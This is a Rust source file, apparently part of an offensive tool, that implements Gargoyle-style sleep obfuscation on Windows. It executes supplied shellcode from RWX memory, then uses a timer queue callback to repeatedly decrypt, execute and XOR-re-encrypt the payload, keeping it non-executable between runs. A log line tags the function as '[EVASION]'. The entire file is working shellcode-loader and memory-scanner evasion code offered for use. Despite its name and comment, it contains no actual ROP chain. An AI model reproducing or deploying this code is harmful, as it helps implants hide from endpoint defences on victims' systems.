//! Gargoyle ROP Timer - encrypt+sleep+decrypt cycle via timer queue and ROP chain

use crate::error::MemoricError;
use serde_json::Value;

/// Gargoyle-style ROP sleep: encrypt shellcode, sleep, decrypt, resume - cyclic via timer
pub fn gargoyle_sleep(args: &Value) -> Result<Value, MemoricError> {
    use crate::util::parse_address;
    use windows::Win32::Foundation::HANDLE;
    use windows::Win32::System::Memory::{
        VirtualAlloc, VirtualProtect, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ,
        PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS, PAGE_READWRITE,
    };
    use windows::Win32::System::Threading::{
        CreateEventW, CreateTimerQueue, CreateTimerQueueTimer, DeleteTimerQueueEx,
        WaitForSingleObject, WORKER_THREAD_FLAGS,
    };

    let shellcode = args.get("shellcode").and_then(|v| v.as_array());
    let address = args.get("address").and_then(parse_address);
    let size = args.get("size").and_then(|v| v.as_u64()).unwrap_or(0) as usize;
    let sleep_ms = args
        .get("sleep_ms")
        .and_then(|v| v.as_u64())
        .unwrap_or(5000) as u32;
    let cycle_count = args
        .get("cycle_count")
        .and_then(|v| v.as_u64())
        .unwrap_or(1) as u32;
    let key = args.get("key").and_then(|v| v.as_u64()).unwrap_or(0x55) as u8;

    tracing::warn!(
        "[EVASION] Gargoyle ROP timer: {}ms sleep, {} cycles",
        sleep_ms,
        cycle_count
    );

    unsafe {
        // Determine shellcode location - either allocate new or use existing
        let (mem, mem_size) = if let Some(sc_array) = shellcode {
            let sc_bytes: Vec<u8> = sc_array
                .iter()
                .filter_map(|v| v.as_u64().map(|b| b as u8))
                .collect();
            if sc_bytes.is_empty() {
                return Err(MemoricError::MemoryAccess("Empty shellcode".to_string()));
            }
            let sc_size = sc_bytes.len();
            let mem = VirtualAlloc(
                None,
                sc_size,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE,
            );
            if mem.is_null() {
                return Err(MemoricError::MemoryAccess(
                    "VirtualAlloc failed".to_string(),
                ));
            }
            std::ptr::copy_nonoverlapping(sc_bytes.as_ptr(), mem as *mut u8, sc_size);
            (mem, sc_size)
        } else if let Some(addr) = address {
            if size == 0 {
                return Err(MemoricError::MemoryAccess(
                    "Must provide size with address".to_string(),
                ));
            }
            (addr as *mut std::ffi::c_void, size)
        } else {
            return Err(MemoricError::MemoryAccess(
                "Provide shellcode array or address+size".to_string(),
            ));
        };

        let mem_ptr = mem as *mut u8;
        let mem_slice = std::slice::from_raw_parts_mut(mem_ptr, mem_size);

        // Create synchronization event
        let event = CreateEventW(None, true, false, None)
            .map_err(|e| MemoricError::WindowsApi(format!("CreateEventW: {}", e)))?;

        let cycles_to_run = if cycle_count == 0 {
            u32::MAX
        } else {
            cycle_count
        };

        // Build the Gargoyle context as a static struct so the timer callback can access it
        struct GargoyleContext {
            mem: *mut u8,
            size: usize,
            key: u8,
            remaining: std::sync::atomic::AtomicU32,
            event: HANDLE,
        }

        let ctx = Box::leak(Box::new(GargoyleContext {
            mem: mem_ptr,
            size: mem_size,
            key,
            remaining: std::sync::atomic::AtomicU32::new(cycles_to_run),
            event,
        }));

        // Timer callback: decrypt → set RX → execute → XOR encrypt → set RW → re-arm or signal done
        unsafe extern "system" fn gargoyle_callback(
            context: *mut std::ffi::c_void,
            _timer_or_wait_fired: windows::Win32::Foundation::BOOLEAN,
        ) {
            let ctx = &*(context as *const GargoyleContext);
            let remaining = ctx
                .remaining
                .fetch_sub(1, std::sync::atomic::Ordering::SeqCst);
            if remaining == 0 {
                let _ = windows::Win32::System::Threading::SetEvent(ctx.event);
                return;
            }

            let mem_slice = std::slice::from_raw_parts_mut(ctx.mem, ctx.size);

            // XOR decrypt
            for byte in mem_slice.iter_mut() {
                *byte ^= ctx.key;
            }

            // Set RX
            let mut old = PAGE_PROTECTION_FLAGS(0);
            let _ = VirtualProtect(ctx.mem as *const _, ctx.size, PAGE_EXECUTE_READ, &mut old);

            // Execute shellcode
            let func: extern "system" fn() = std::mem::transmute(ctx.mem);
            func();

            // XOR encrypt
            let mem_slice = std::slice::from_raw_parts_mut(ctx.mem, ctx.size);
            let mut old2 = PAGE_PROTECTION_FLAGS(0);
            let _ = VirtualProtect(ctx.mem as *const _, ctx.size, PAGE_READWRITE, &mut old2);
            for byte in mem_slice.iter_mut() {
                *byte ^= ctx.key;
            }
        }

        // First cycle: execute immediately, then encrypt for sleep
        if shellcode.is_some() {
            // Already in RWX, execute first
            let func: extern "system" fn() = std::mem::transmute(mem_ptr);
            func();
        }

        // XOR encrypt for sleep
        for byte in mem_slice.iter_mut() {
            *byte ^= key;
        }
        // Set RW (non-executable during sleep)
        let mut old_prot = PAGE_PROTECTION_FLAGS(0);
        let _ = VirtualProtect(mem as *const _, mem_size, PAGE_READWRITE, &mut old_prot);

        // Create timer queue and arm timer
        let queue = CreateTimerQueue()
            .map_err(|e| MemoricError::WindowsApi(format!("CreateTimerQueue: {}", e)))?;

        let mut timer_handle = HANDLE::default();
        CreateTimerQueueTimer(
            &mut timer_handle,
            queue,
            Some(
                gargoyle_callback
                    as unsafe extern "system" fn(
                        *mut std::ffi::c_void,
                        windows::Win32::Foundation::BOOLEAN,
                    ),
            ),
            Some(ctx as *const GargoyleContext as *const _),
            sleep_ms,
            sleep_ms, // due_time and period
            WORKER_THREAD_FLAGS(0),
        )
        .map_err(|e| MemoricError::WindowsApi(format!("CreateTimerQueueTimer: {}", e)))?;

        // Wait for all cycles to complete (or timeout at 10x total expected time)
        let total_timeout = sleep_ms
            .saturating_mul(cycles_to_run.min(100))
            .saturating_add(5000);
        WaitForSingleObject(event, total_timeout);

        // Cleanup
        let _ = DeleteTimerQueueEx(queue, None);
        let _ = windows::Win32::Foundation::CloseHandle(event);

        // Decrypt final state
        let mem_slice = std::slice::from_raw_parts_mut(mem_ptr, mem_size);
        for byte in mem_slice.iter_mut() {
            *byte ^= key;
        }
        let _ = VirtualProtect(mem as *const _, mem_size, PAGE_EXECUTE_READ, &mut old_prot);

        // Leak cleanup
        let _ = Box::from_raw(ctx as *const GargoyleContext as *mut GargoyleContext);

        Ok(serde_json::json!({
            "success": true,
            "technique": "gargoyle_rop_timer",
            "shellcode_address": format!("0x{:016X}", mem as usize),
            "size": mem_size,
            "sleep_ms": sleep_ms,
            "cycles": cycle_count,
            "key": format!("0x{:02X}", key),
            "message": "Gargoyle timer cycle complete - shellcode encrypted during sleep, decrypted+executed on timer fire"
        }))
    }
}
